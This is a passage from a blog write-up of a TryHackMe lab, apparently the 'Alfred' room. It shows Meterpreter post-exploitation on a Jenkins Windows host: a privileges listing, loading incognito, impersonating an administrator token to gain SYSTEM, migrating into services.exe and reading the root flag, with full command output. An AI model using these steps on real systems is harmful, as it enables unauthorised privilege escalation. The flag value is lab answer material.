0%20%20%20%20Enabled%0ASeRemoteShutdownPrivilege%20%20%20%20%20%20%20Force%20shutdown%20from%20a%20remote%20system%20%20%20%20%20%20%20Disabled%0ASeUndockPrivilege%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Remove%20computer%20from%20docking%20station%20%20%20%20%20%20Disabled%0ASeManageVolumePrivilege%20%20%20%20%20%20%20%20%20Perform%20volume%20maintenance%20tasks%20%20%20%20%20%20%20%20%20%20Disabled%0ASeImpersonatePrivilege%20%20%20%20%20%20%20%20%20%20Impersonate%20a%20client%20after%20authentication%20Enabled%0ASeCreateGlobalPrivilege%20%20%20%20%20%20%20%20%20Create%20global%20objects%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Enabled%0ASeIncreaseWorkingSetPrivilege%20%20%20Increase%20a%20process%20working%20set%20%20%20%20%20%20%20%20%20%20%20%20Disabled%0ASeTimeZonePrivilege%20%20%20%20%20%20%20%20%20%20%20%20%20Change%20the%20time%20zone%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Disabled%0ASeCreateSymbolicLinkPrivilege%20%20%20Create%20symbolic%20links%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Disabled" type="button"></button></div></div><pre><code>PRIVILEGES INFORMATION

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
</code></pre><p>Background the current <code>meterpreter</code> session.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="C:%5CProgram%20Files%20(x86)%5CJenkins%5Cworkspace%5Cproject%3E%5EZ%0ABackground%20channel%201?%20[y/N]%20%20y" type="button"></button></div></div><pre><code>C:\Program Files (x86)\Jenkins\workspace\project&gt;^Z
Background channel 1? [y/N]  y
</code></pre><p>Load <code>incognito</code> mode.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%20%3E%20load%20incognito%0ALoading%20extension%20incognito...Success." type="button"></button></div></div><pre><code>meterpreter &gt; load incognito
Loading extension incognito...Success.
</code></pre><p>List the currently avilable tokens in <code>meterpreter</code> shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%20%3E%20list_tokens%20-g%0A[-]%20Warning:%20Not%20currently%20running%20as%20SYSTEM,%20not%20all%20tokens%20will%20be%20available%0A%20%20%20%20%20%20%20%20%20%20%20%20Call%20rev2self%20if%20primary%20process%20token%20is%20SYSTEM%0A%0ADelegation%20Tokens%20Available%0A%5C%0ABUILTIN%5CAdministrators%0ABUILTIN%5CIIS_IUSRS%0ABUILTIN%5CUsers%0ANT%20AUTHORITY%5CAuthenticated%20Users%0ANT%20AUTHORITY%5CNTLM%20Authentication%0ANT%20AUTHORITY%5CSERVICE%0ANT%20AUTHORITY%5CThis%20Organization%0ANT%20AUTHORITY%5CWRITE%20RESTRICTED%0ANT%20SERVICE%5CAppHostSvc%0ANT%20SERVICE%5CAudioEndpointBuilder%0ANT%20SERVICE%5CBFE%0ANT%20SERVICE%5CCertPropSvc%0ANT%20SERVICE%5CCscService%0ANT%20SERVICE%5CDnscache%0ANT%20SERVICE%5Ceventlog%0ANT%20SERVICE%5CEventSystem%0ANT%20SERVICE%5CFDResPub%0ANT%20SERVICE%5Ciphlpsvc%0ANT%20SERVICE%5CLanmanServer%0ANT%20SERVICE%5CMMCSS%0ANT%20SERVICE%5CPcaSvc%0ANT%20SERVICE%5CPlugPlay%0ANT%20SERVICE%5CRpcEptMapper%0ANT%20SERVICE%5CSchedule%0ANT%20SERVICE%5CSENS%0ANT%20SERVICE%5CSessionEnv%0ANT%20SERVICE%5CSpooler%0ANT%20SERVICE%5CTrkWks%0ANT%20SERVICE%5CTrustedInstaller%0ANT%20SERVICE%5CUmRdpService%0ANT%20SERVICE%5CUxSms%0ANT%20SERVICE%5CWinmgmt%0ANT%20SERVICE%5CWSearch%0ANT%20SERVICE%5Cwuauserv%0A%0AImpersonation%20Tokens%20Available%0ANT%20AUTHORITY%5CNETWORK%0ANT%20SERVICE%5CAudioSrv%0ANT%20SERVICE%5CCryptSvc%0ANT%20SERVICE%5CDcomLaunch%0ANT%20SERVICE%5CDhcp%0ANT%20SERVICE%5CDPS%0ANT%20SERVICE%5CLanmanWorkstation%0ANT%20SERVICE%5Clmhosts%0ANT%20SERVICE%5CMpsSvc%0ANT%20SERVICE%5Cnetprofm%0ANT%20SERVICE%5CNlaSvc%0ANT%20SERVICE%5Cnsi%0ANT%20SERVICE%5CPolicyAgent%0ANT%20SERVICE%5CPower%0ANT%20SERVICE%5CShellHWDetection%0ANT%20SERVICE%5CTermService%0ANT%20SERVICE%5CW32Time%0ANT%20SERVICE%5CWdiServiceHost%0ANT%20SERVICE%5CWinHttpAutoProxySvc%0ANT%20SERVICE%5Cwscsvc" type="button"></button></div></div><pre><code>meterpreter &gt; list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
            Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\CryptSvc
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\LanmanWorkstation
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\NlaSvc
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\TermService
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc
</code></pre><p>Impersonate using <code>administrator</code> token.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%20%3E%20impersonate_token%20%22BUILTIN%5CAdministrators%22%0A[-]%20Warning:%20Not%20currently%20running%20as%20SYSTEM,%20not%20all%20tokens%20will%20be%20available%0A%20%20%20%20%20%20%20%20%20%20%20%20Call%20rev2self%20if%20primary%20process%20token%20is%20SYSTEM%0A[+]%20Delegation%20token%20available%0A[+]%20Successfully%20impersonated%20user%20NT%20AUTHORITY%5CSYSTEM%0A%0Ameterpreter%20%3E%20getuid%0AServer%20username:%20NT%20AUTHORITY%5CSYSTEM" type="button"></button></div></div><pre><code>meterpreter &gt; impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
            Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre><p>Check the current list of processes.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%20%3E%20ps%0A%0AProcess%20List%0A%0APID%20%20%20PPID%20%20Name%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Arch%20%20Session%20%20User%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Path%0A---%20%20%20----%20%20----%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20----%20%20-------%20%20----%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20----%0A0%20%20%20%20%200%20%20%20%20%20[System%20Process]%0A4%20%20%20%20%200%20%20%20%20%20System%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%0A396%20%20%204%20%20%20%20%20smss.exe%20%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Csmss.exe%0A524%20%20%20516%20%20%20csrss.exe%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Ccsrss.exe%0A572%20%20%20564%20%20%20csrss.exe%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%201%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Ccsrss.exe%0A580%20%20%20516%20%20%20wininit.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cwininit.exe%0A608%20%20%20564%20%20%20winlogon.exe%20%20%20%20%20%20%20%20%20%20x64%20%20%201%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cwinlogon.exe%0A668%20%20%20580%20%20%20services.exe%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cservices.exe%0A676%20%20%20580%20%20%20lsass.exe%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Clsass.exe%0A684%20%20%20580%20%20%20lsm.exe%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Clsm.exe%0A772%20%20%20668%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A848%20%20%20668%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CNETWORK%20SERVICE%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A916%20%20%20668%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CLOCAL%20SERVICE%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A920%20%20%20608%20%20%20LogonUI.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%201%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5CLogonUI.exe%0A936%20%20%20668%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CLOCAL%20SERVICE%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A992%20%20%20668%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A1016%20%20668%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A1064%20%20668%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CNETWORK%20SERVICE%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A1112%20%202056%20%20powershell.exe%20%20%20%20%20%20%20%20x86%20%20%200%20%20%20%20%20%20%20%20alfred%5Cbruce%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSysWOW64%5CWindowsPowerShell%5Cv1.0%5Cpowershell.exe%0A1212%20%20668%20%20%20spoolsv.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cspoolsv.exe%0A1240%20%20668%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CLOCAL%20SERVICE%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A1356%20%20668%20%20%20amazon-ssm-agent.exe%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CProgram%20Files%5CAmazon%5CSSM%5Camazon-ssm-agent.exe%0A1420%20%20668%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A1448%20%20668%20%20%20LiteAgent.exe%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CProgram%20Files%5CAmazon%5CXentools%5CLiteAgent.exe%0A1476%20%20668%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CLOCAL%20SERVICE%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A1620%20%20668%20%20%20jenkins.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20alfred%5Cbruce%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20C:%5CProgram%20Files%20(x86)%5CJenkins%5Cjenkins.exe%0A1704%20%20668%20%20%20TrustedInstaller.exe%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5Cservicing%5CTrustedInstaller.exe%0A1708%20%20668%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CNETWORK%20SERVICE%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A1712%20%20668%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A1816%20%201620%20%20java.exe%20%20%20%20%20%20%20%20%20%20%20%20%20%20x86%20%20%200%20%20%20%20%20%20%20%20alfred%5Cbruce%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20C:%5CProgram%20Files%20(x86)%5CJenkins%5Cjre%5Cbin%5Cjava.exe%0A1844%20%20668%20%20%20Ec2Config.exe%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CProgram%20Files%5CAmazon%5CEc2ConfigService%5CEc2Config.exe%0A1936%20%20524%20%20%20conhost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20alfred%5Cbruce%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cconhost.exe%0A2056%20%201816%20%20cmd.exe%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x86%20%20%200%20%20%20%20%20%20%20%20alfred%5Cbruce%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSysWOW64%5Ccmd.exe%0A2064%20%201112%20%20shell.exe%20%20%20%20%20%20%20%20%20%20%20%20%20x86%20%20%200%20%20%20%20%20%20%20%20alfred%5Cbruce%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20C:%5CProgram%20Files%20(x86)%5CJenkins%5Cworkspace%5Cproject%5Cshell.exe%0A2364%20%20772%20%20%20WmiPrvSE.exe%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CNETWORK%20SERVICE%20%20C:%5CWindows%5CSystem32%5Cwbem%5CWmiPrvSE.exe%0A2668%20%202064%20%20cmd.exe%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x86%20%20%200%20%20%20%20%20%20%20%20alfred%5Cbruce%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSysWOW64%5Ccmd.exe%0A2840%20%20524%20%20%20conhost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20alfred%5Cbruce%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cconhost.exe%0A2880%20%20524%20%20%20conhost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20alfred%5Cbruce%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cconhost.exe%0A2988%20%20668%20%20%20sppsvc.exe%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CNETWORK%20SERVICE%20%20C:%5CWindows%5CSystem32%5Csppsvc.exe%0A3016%20%20668%20%20%20SearchIndexer.exe%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5CSearchIndexer.exe%0A3068%20%20668%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe" type="button"></button></div></div><pre><code>meterpreter &gt; ps

Process List

PID   PPID  Name                  Arch  Session  User                          Path
---   ----  ----                  ----  -------  ----                          ----
0     0     [System Process]
4     0     System                x64   0
396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
684   580   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
772   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
848   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
916   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
920   608   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
936   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
992   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
1016  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
1064  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
1112  2056  powershell.exe        x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
1212  668   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
1240  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
1356  668   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
1420  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
1448  668   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
1476  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
1620  668   jenkins.exe           x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkins.exe
1704  668   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
1708  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
1712  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
1816  1620  java.exe              x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bin\java.exe
1844  668   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
1936  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
2056  1816  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
2064  1112  shell.exe             x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\workspace\project\shell.exe
2364  772   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
2668  2064  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
2840  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
2880  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
2988  668   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
3016  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
3068  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
</code></pre><p>Migrate to <code>services.exe</code> process id and get the flag.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%20%3E%20migrate%20668%0A[*]%20Migrating%20from%202064%20to%20668...%0A[*]%20Migration%20completed%20successfully.%0A%0Ameterpreter%20%3E%20cat%20%22C:%5CWindows%5CSystem32%5Cconfig%5Croot.txt%22%0Adff0f748678f280250f25a45b8046b4a" type="button"></button></div></div><pre><code>meterpreter &gt; migrate 668
[*] Migrating from 2064 to 668...
[*] Migration completed successfully.

meterpreter &gt; cat "C:\Windows\System32\config\root.txt"
dff0f748678f280250f25a45b8046b4a
</code></pre></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/tryhackme-blue/"><div class="card-body"> <span class="timeago small" > Mar 23 <i class="unloaded">2021-03-23T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Blue</h3><div class="text-muted small"><p> Blue This room contains detailed info about eternalblue vulnerability of samba and windows privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumeratio...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-steel-mountain/"><div class="card-body"> <span class="timeago small" > Mar 24 <i class="unloaded">2021-03-24T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Steel Mountain</h3><div class="text-muted small"><p> Steel Mountain This room contains detailed info about rejetto http vulnerability exploitation and privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enu...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-hackpark/"><div class="card-body"> <span class="timeago small" > Mar 25 <i class="unloaded">2021-03-25T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - HackPark</h3><div class="text-muted small"><p> HackPark This room contains detailed info about rejetto http vulnerability exploitation and privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumerati...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/tryhackme-active-directory-basics/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Active Directory Basics</p></a> <a href="/posts/tryhackme-blue/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Blue</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> Â© 2021 <a href="https://github.com/4n3i5v74">4n3i5v74</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/network/">network</a> <a class="post-tag" href="/tags/protocols/">protocols</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/windows/">windows</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted 